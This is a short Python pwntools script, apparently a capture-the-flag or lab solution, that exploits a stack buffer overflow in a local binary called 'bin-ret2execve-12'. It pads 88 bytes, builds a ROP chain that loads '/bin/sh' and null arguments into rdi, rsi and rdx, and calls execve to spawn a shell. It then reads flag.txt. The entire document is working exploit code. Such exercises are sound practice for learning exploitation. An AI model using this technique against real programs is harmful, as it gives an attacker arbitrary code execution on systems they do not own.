from pwn import *
from time import sleep

# make pwntools shut up!!!
logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = '../bins3/bin-ret2execve-12'
io = process(binary)
elf = ELF(binary)
rop = ROP(elf)

buf = b'A'*88
chain = b''

# populate arg1 - rdi
chain += p64((rop.find_gadget(['pop rdi', 'ret']))[0])
chain += p64(next(elf.search(b'/bin/sh\x00')))

# populate arg2 - rsi
chain += p64((rop.find_gadget(['pop rsi', 'ret']))[0])
chain += p64(0)

# populate arg3 - rdx
#chain += p64((rop.find_gadget(['pop rdx', 'ret']))[0])
# 0x00000000004007c0: pop rdx; pop r11; pop r8; ret;

chain += p64(0x00000000004007c0)
chain += p64(0)*3



chain += p64(elf.sym['execve'])

io.sendline(buf + chain)

sleep(0.1)
io.sendline(b'cat flag.txt')
io.recvuntil(b'flag')
print("flag" + io.recvuntil(b'}').decode('utf-8'))
